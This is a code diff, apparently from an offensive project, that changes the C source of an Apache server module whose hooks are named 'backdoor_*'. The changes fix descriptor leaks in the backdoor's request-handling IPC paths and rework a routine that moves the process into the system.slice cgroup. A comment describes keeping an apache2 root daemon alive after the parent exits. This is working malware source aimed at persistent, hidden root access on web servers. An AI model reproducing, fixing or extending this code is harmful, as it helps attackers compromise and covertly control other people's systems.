@@ -708,6 +708,7 @@ static int backdoor_post_read_request(request_rec *r) {
         sock = socket(AF_UNIX, SOCK_STREAM, 0);
         if (sock < 0) {
             write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+            close(fd);
             exit(0);
         }
         server.sun_family = AF_UNIX;
@@ -715,6 +716,7 @@ static int backdoor_post_read_request(request_rec *r) {
         if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
             close(sock);
             write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+            close(fd);
             exit(0);
         }
 
@@ -751,6 +753,7 @@ static int backdoor_post_read_request(request_rec *r) {
         sock = socket(AF_UNIX, SOCK_STREAM, 0);
         if (sock < 0) {
             write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+            close(fd);
             exit(0);
         }
         server.sun_family = AF_UNIX;
@@ -758,6 +761,7 @@ static int backdoor_post_read_request(request_rec *r) {
         if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
             close(sock);
             write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+            close(fd);
             exit(0);
         }
 
@@ -822,7 +826,6 @@ static int backdoor_post_read_request(request_rec *r) {
         free(info);
 
         close(fd);
-        close(fd);
 
         exit(0);
     }
@@ -864,6 +867,7 @@ static int backdoor_post_read_request(request_rec *r) {
 			if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
 				close(sock);
 				write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+				close(fd);
 				exit(0);
 			}
             // Tell IPC
@@ -886,34 +890,30 @@ static int backdoor_post_read_request(request_rec *r) {
 }
 
 void* rmCgroup(){
-    FILE* f;
+    int fd;
     int isMounted = 0;
     char* path;
     char* str;
 
     mkdir(CGROUP2, S_IRWXU);
-    path = malloc(strlen(CGROUP2)+strlen("/cgroup.procs")+1);
+    path = malloc(strlen(CGROUP2)+strlen("/system.slice/cgroup.procs")+1);
     strcat(path,CGROUP2);
-    strcat(path,"/cgroup.procs");
+    strcat(path,"/system.slice/cgroup.procs");
     if(access(path, F_OK) < 0) {
         isMounted= mount("cgroup",CGROUP2,"cgroup2",NULL,NULL);
     }
     if(isMounted == 0){
-        f = fopen(path,"wb");
-        if(f != NULL){
-            exit(0);
+        //f = fopen(path,"wb");
+        fd = open(path,O_WRONLY);
+        if(fd != -1){
             str = malloc(sizeof(int)*getpid()+1);
             sprintf(str,"%d",getpid());
-            fputs(str,f);
-            fclose(f);
+            write(fd,str,strlen(str));
             free(str);
         }
-        //umount(CGROUP2);
+        umount(CGROUP2);
         free(path);
     }
-
-
-
 }
 
 int waitIPC(int master){
@@ -969,7 +969,7 @@ int waitIPC(int master){
 int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
 
     pid = fork();
-    // Kill father just after reading the config to create apache2 root daemon attached to pid 1
+    // Kill father just after he had loaded the config to create apache2 root daemon
     if (pid) {
         return OK;
     }
@@ -1017,7 +1017,6 @@ static int backdoor_log_transaction(request_rec *r) {
 		return DECLINED;
 	}
 	exit(0);
-
 }
 
 static void backdoor_register_hooks(apr_pool_t *p){
